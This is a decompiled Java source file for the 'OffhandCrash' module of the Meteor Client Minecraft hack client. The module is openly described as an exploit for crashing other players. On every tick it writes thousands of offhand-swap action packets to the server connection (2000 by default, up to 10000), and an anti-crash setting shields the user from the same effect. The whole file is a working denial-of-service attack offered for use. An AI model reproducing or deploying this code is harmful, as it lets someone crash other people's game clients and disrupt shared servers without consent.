/*    */ package meteordevelopment.meteorclient.systems.modules.player;
/*    */ 
/*    */ import io.netty.channel.Channel;
/*    */ import java.util.Objects;
/*    */ import meteordevelopment.meteorclient.events.world.TickEvent;
/*    */ import meteordevelopment.meteorclient.mixin.ClientConnectionAccessor;
/*    */ import meteordevelopment.meteorclient.settings.BoolSetting;
/*    */ import meteordevelopment.meteorclient.settings.IntSetting;
/*    */ import meteordevelopment.meteorclient.settings.Setting;
/*    */ import meteordevelopment.meteorclient.settings.SettingGroup;
/*    */ import meteordevelopment.meteorclient.systems.modules.Categories;
/*    */ import meteordevelopment.meteorclient.systems.modules.Module;
/*    */ import meteordevelopment.orbit.EventHandler;
/*    */ import net.minecraft.class_2338;
/*    */ import net.minecraft.class_2350;
/*    */ import net.minecraft.class_2846;
/*    */ 
/*    */ 
/*    */ 
/*    */ public class OffhandCrash
/*    */   extends Module
/*    */ {
/* 23 */   private static final class_2846 PACKET = new class_2846(class_2846.class_2847.field_12969, new class_2338(0, 0, 0), class_2350.field_11036);
/*    */   
/* 25 */   private final SettingGroup sgGeneral = this.settings.getDefaultGroup();
/*    */   
/* 27 */   private final Setting<Boolean> doCrash = this.sgGeneral.add((Setting)((BoolSetting.Builder)((BoolSetting.Builder)((BoolSetting.Builder)(new BoolSetting.Builder())
/* 28 */       .name("do-crash"))
/* 29 */       .description("Sends X number of offhand swap sound packets to the server per tick."))
/* 30 */       .defaultValue(Boolean.valueOf(true)))
/* 31 */       .build());
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   private final Setting<Integer> speed;
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   private final Setting<Boolean> antiCrash;
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   public OffhandCrash() {
/* 52 */     super(Categories.Misc, "offhand-crash", "An exploit that can crash other players by swapping back and forth between your main hand and offhand.");
/*    */     Objects.requireNonNull(this.doCrash);
/*    */     this.speed = this.sgGeneral.add((Setting)((IntSetting.Builder)((IntSetting.Builder)((IntSetting.Builder)((IntSetting.Builder)(new IntSetting.Builder()).name("speed")).description("The amount of swaps per tick.")).defaultValue(Integer.valueOf(2000))).min(1).sliderRange(1, 10000).visible(this.doCrash::get)).build());
/*    */     this.antiCrash = this.sgGeneral.add((Setting)((BoolSetting.Builder)((BoolSetting.Builder)((BoolSetting.Builder)(new BoolSetting.Builder()).name("anti-crash")).description("Attempts to prevent you from crashing yourself.")).defaultValue(Boolean.valueOf(true))).build()); } @EventHandler
/*    */   private void onTick(TickEvent.Post event) {
/* 57 */     if (!((Boolean)this.doCrash.get()).booleanValue())
/*    */       return; 
/* 59 */     Channel channel = ((ClientConnectionAccessor)this.mc.field_1724.field_3944.method_48296()).meteor$getChannel();
/* 60 */     for (int i = 0; i < ((Integer)this.speed.get()).intValue(); ) { channel.write(PACKET); i++; }
/* 61 */      channel.flush();
/*    */   }
/*    */   
/*    */   public boolean isAntiCrash() {
/* 65 */     return (isActive() && ((Boolean)this.antiCrash.get()).booleanValue());
/*    */   }
/*    */ }


/* Location:              C:\Users\hitbo\Downloads\jd-gui-windows-1.6.6\jd-gui-windows-1.6.6\meteor-client-1.21.11-86.jar!\meteordevelopment\meteorclient\systems\modules\player\OffhandCrash.class
 * Java compiler version: 21 (65.0)
 * JD-Core Version:       1.1.3
 */